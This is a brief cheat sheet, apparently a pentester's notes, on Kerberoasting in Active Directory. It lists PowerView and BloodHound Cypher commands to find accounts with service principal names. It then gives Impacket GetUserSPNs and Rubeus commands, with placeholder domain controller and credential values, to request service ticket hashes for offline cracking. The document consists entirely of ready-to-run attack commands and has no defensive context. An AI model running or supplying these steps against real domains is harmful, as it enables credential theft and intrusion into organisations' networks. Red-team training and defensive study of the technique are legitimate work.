# Kerberoasting

### Get kerberoastable users

 - Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName

 - MATCH (u:User {hasspn:true}) RETURN u (Bloodhound cypher query)

 - MATCH (u:User {hasspn:true}), (c:Computer),p=shortestPath((u)-[*1..]->(c)) RETURN p (Bloodhound cypher query)

### Get hash (TGS)

 - Impacket-GetUserSPNs -request -dc-ip DC_IP DOMAIN/USER:PASSWORD

 - Rubeus kerberoast
